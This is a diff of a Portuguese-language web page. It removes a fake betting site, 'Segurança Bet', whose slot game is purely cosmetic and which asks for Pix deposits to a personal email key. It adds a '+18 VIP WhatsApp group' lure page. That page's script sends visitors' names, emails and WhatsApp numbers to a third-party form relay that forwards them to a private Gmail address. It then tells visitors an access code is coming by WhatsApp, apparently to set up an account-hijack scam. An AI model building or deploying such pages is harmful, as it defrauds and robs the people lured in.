@@ -2,125 +2,85 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Segurança Bet</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Conteúdo VIP +18</title>
   <style>
     body {
-      background: #121212;
-      color: white;
+      margin: 0;
       font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
       text-align: center;
-      margin: 0;
-      padding: 0;
     }
-
-    header {
-      background: #1f1f1f;
+    .container {
       padding: 20px;
+      max-width: 400px;
+      margin: auto;
     }
-
-    h1 {
-      margin: 0;
-      color: #ffd700;
-    }
-
-    .game-container {
-      padding: 20px;
-    }
-
-    .slot {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
+    img {
+      max-width: 100%;
+      border-radius: 10px;
       margin-bottom: 20px;
     }
-
-    .slot div {
-      background: #222;
-      padding: 30px;
-      font-size: 2em;
-      border-radius: 10px;
-      width: 60px;
-    }
-
-    .btn {
-      padding: 10px 20px;
-      background: #00e676;
+    input, button {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
       border: none;
       border-radius: 5px;
-      font-weight: bold;
+      font-size: 16px;
+    }
+    input {
+      background-color: #222;
+      color: #fff;
+    }
+    button {
+      background-color: #e91e63;
+      color: #fff;
       cursor: pointer;
     }
-
-    .pix-box {
-      background: #1f1f1f;
-      margin: 30px auto;
-      padding: 20px;
-      width: 90%;
-      max-width: 400px;
-      border-radius: 10px;
-    }
-
-    textarea {
-      width: 100%;
-      height: 60px;
-      margin-top: 10px;
-      border: none;
-      padding: 10px;
-      font-size: 14px;
-    }
-
-    img {
-      max-width: 200px;
-      margin-top: 10px;
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<header>
-  <h1>Segurança Bet</h1>
-</header>
+  <div class="container" id="form-container">
+    <h1>Grupo VIP +18</h1>
+    <p>Entre agora no nosso grupo privado de conteúdo adulto no WhatsApp.</p>
+    <img src="https://images.pexels.com/photos/14440603/pexels-photo-14440603.jpeg" alt="Modelo">
 
-<div class="game-container">
-  <h2>Caça-Níquel do Tigrinho</h2>
-  <div class="slot" id="slot">
-    <div>🐯</div>
-    <div>💰</div>
-    <div>🍀</div>
+    <form id="vip-form">
+      <input type="text" name="nome" placeholder="Seu nome" required>
+      <input type="email" name="email" placeholder="Seu e-mail" required>
+      <input type="tel" name="whatsapp" placeholder="Seu WhatsApp com DDD" required>
+      <button type="submit">Quero entrar no grupo</button>
+    </form>
   </div>
-  <button class="btn" onclick="girar()">Girar</button>
-  <p id="resultado">Boa sorte!</p>
-</div>
 
-<div class="pix-box">
-  <h3>Depósito via Pix</h3>
-  <p>Chave Pix: <strong>joao.rooaz@gmail.com</strong></p>
-  <label>Copia e Cola:</label>
-  <textarea readonly>00020126590014br.gov.bcb.pix0120joao.rooaz@gmail.com0213SEGURANCABET@5204000053039865802BR5901N6001C62070503***6304573D</textarea>
-  <p>Escaneie o QR Code abaixo:</p>
-  <img src="qrcode.png" alt="QR Code Pix">
-</div>
+  <div class="container hidden" id="confirmacao">
+    <h1>Enviando código...</h1>
+    <p>Estamos enviando o código de acesso para o número informado via WhatsApp.</p>
+    <p>Aguarde alguns instantes...</p>
+  </div>
 
-<script>
-  const simbolos = ['🐯', '💰', '🍀', '⭐', '🎰', '🍒'];
-  function girar() {
-    const slot = document.getElementById('slot');
-    const resultado = [];
-    slot.innerHTML = '';
-    for (let i = 0; i < 3; i++) {
-      const s = simbolos[Math.floor(Math.random() * simbolos.length)];
-      resultado.push(s);
-      const el = document.createElement('div');
-      el.textContent = s;
-      slot.appendChild(el);
-    }
-    document.getElementById('resultado').innerText =
-      (resultado[0] === resultado[1] && resultado[1] === resultado[2])
-        ? 'Você ganhou!'
-        : 'Tente novamente!';
-  }
-</script>
+  <script>
+    const form = document.getElementById("vip-form");
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const dados = new FormData(form);
+      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        headers: { 'Accept': 'application/json' },
+        body: dados
+      }).then(response => {
+        document.getElementById("form-container").classList.add("hidden");
+        document.getElementById("confirmacao").classList.remove("hidden");
+      }).catch(error => {
+        alert("Erro ao enviar. Tente novamente.");
+      });
+    });
+  </script>
 
 </body>
 </html>
